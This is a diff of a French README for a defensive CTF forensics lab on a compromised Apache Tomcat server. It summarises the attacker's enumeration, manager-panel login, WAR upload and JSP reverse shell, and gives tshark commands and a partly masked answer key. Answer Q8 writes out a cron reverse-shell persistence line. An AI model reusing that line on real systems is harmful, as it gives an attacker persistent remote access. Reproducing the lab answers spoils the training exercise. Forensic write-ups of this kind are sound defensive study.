@@ -1,85 +1,75 @@
-# Tomcat Takeover Lab
+# README — Tomcat Takeover Lab
 
-## Platform
+Statut : terminé  
+Type : analyse PCAP, forensic réseau, SOC, réponse à incident
 
-CyberDefenders
+## Objectif du lab
 
-Official link: https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/
+L’objectif de ce lab est d’analyser une compromission d’un serveur Apache Tomcat à partir d’un fichier PCAP.
 
-## Information
+L’analyse permet d’identifier :
 
-| Field | Value |
+- l’adresse IP de l’attaquant ;
+- le service exposé ;
+- l’outil utilisé pour l’énumération ;
+- le panneau d’administration découvert ;
+- les identifiants valides ;
+- le fichier WAR malveillant uploadé ;
+- la JSP utilisée comme reverse shell ;
+- la connexion reverse shell ;
+- la persistance installée sur la machine compromise.
+
+## Résumé de l’incident
+
+Le serveur `**********` expose un service Apache Tomcat sur le port `****`.
+
+L’attaquant `**********` effectue d’abord une navigation et une énumération web. Le User-Agent `************` apparaît dans les requêtes HTTP, ce qui confirme l’utilisation de Gobuster pour découvrir des chemins sensibles.
+
+L’attaquant découvre ensuite `/*******`, puis accède à `/*******/html`. Plusieurs tentatives d’authentification Basic sont observées. La combinaison valide identifiée est `*****:******`.
+
+Une fois connecté au Tomcat Manager, l’attaquant upload le fichier `******.***`. Ce WAR déploie une application accessible via `/******/` et contient une JSP malveillante nommée `********.***`.
+
+La JSP lance un shell système et établit une connexion sortante vers `**********:80`. Dans le flux TCP `****`, les commandes observées montrent que l’attaquant obtient l’utilisateur `****`, se déplace dans `/tmp`, puis installe une persistance cron vers `**********:443`.
+
+## Réponses finales du lab
+
+| Question | Réponse |
 |---|---|
-| Lab | Tomcat Takeover |
-| Track | SOC Analyst Tier 1 |
-| Level | Level 3 |
-| Difficulty | Easy |
-| Category | Network Forensics |
-| Estimated time | 30 minutes |
-| Suggested tools | Wireshark, NetworkMiner |
-| Status | In progress |
+| Q1 | `**********` |
+| Q2 | `*****` |
+| Q3 | `****` |
+| Q4 | `********` |
+| Q5 | `/*******` |
+| Q6 | `*****:******` |
+| Q7 | `******.***` |
+| Q8 | `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/*** 0>&1'` |
 
-## Summary
+## Commandes principales utilisées
 
-This lab consists of analyzing a PCAP file to identify suspicious activity targeting an Apache Tomcat web server.
+### Extraire les requêtes HTTP
 
-The scenario states that the SOC team detected suspicious activity on an internal web server. The PCAP should help understand the scope of the attack and the actions performed by the attacker.
+```bash
+tshark -r "web server.pcap" -Y "http.request" -T fields -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport -e http.request.method -e http.host -e http.request.uri -e http.user_agent
+```
 
-## Provided Artifact
+### Identifier l’upload WAR
 
-| File | Type | Comment |
-|---|---|---|
-| `web server.pcap` | PCAP | Network capture to analyze |
+```bash
+tshark -r "web server.pcap" -Y 'http.request.method == "POST" || http.request.uri contains "upload" || http.request.uri contains "******"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri -e http.file_data
+```
 
-## Artifact Hashes
+### Identifier les identifiants Basic Auth
 
-| Type | Value |
-|---|---|
-| MD5 | `9ab62c5a2a1f8d0030f8240355305e7` |
-| SHA256 | `9a8db2ec46186ff541f8f307544a5ceb07ce702f36d36fd8ae964bcb53f716` |
+```bash
+tshark -r "web server.pcap" -Y 'http.authorization || http.authbasic || http.request.uri contains "/*******/html"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e http.request.method -e http.request.uri -e http.authorization -e http.authbasic
+```
 
+### Suivre le flux reverse shell
 
-## Learning Objectives
+```bash
+tshark -r "web server.pcap" -q -z follow,tcp,ascii,****
+```
 
-- analyze a network capture with Wireshark
-- identify scanning activity
-- identify the attacker source IP address
-- identify open ports and the web administration panel
-- recognize enumeration tools
-- analyze an HTTP brute-force attempt
-- identify a successful authentication
-- find a malicious uploaded file
-- understand reverse shell behavior
-- identify a persistence command
+## Conclusion
 
-## Lab Questions
-
-| Number | Topic |
-|---|---|
-| Q1 | Source IP address responsible for scanning requests |
-| Q2 | Country associated with the attacker IP address |
-| Q3 | Port providing access to the web admin panel |
-| Q4 | Tool used during enumeration |
-| Q5 | Specific directory related to the admin panel |
-| Q6 | Credentials successfully used for login |
-| Q7 | Name of the uploaded malicious file |
-| Q8 | Scheduled command used to maintain persistence |
-
-## Folder Structure
-
-| File | Description |
-|---|---|
-| `readme_TOMCAT_TAKEOVER.md` | Lab overview in French |
-| `Readme_Tomcat_Takeover_EN.md` | Lab overview in English |
-| `writeup-fr.md` | French writeup |
-| `writeup-en.md` | English writeup |
-| `notes-fr.md` | French investigation notes |
-| `notes-en.md` | English investigation notes |
-| `iocs-fr.md` | French indicators of compromise |
-| `iocs-en.md` | English indicators of compromise |
-
-## Disclaimer
-
-Answers will be partially masked in public writeups to avoid direct copy-pasting and preserve the educational value of the lab.
-
-This lab is documented only for educational, defensive, and controlled cybersecurity training purposes.
+Le serveur Tomcat a été compromis via le panneau Tomcat Manager. L’attaquant a utilisé des identifiants valides, uploadé une archive WAR malveillante, déclenché une JSP de reverse shell, obtenu un accès `****`, puis installé une persistance cron.
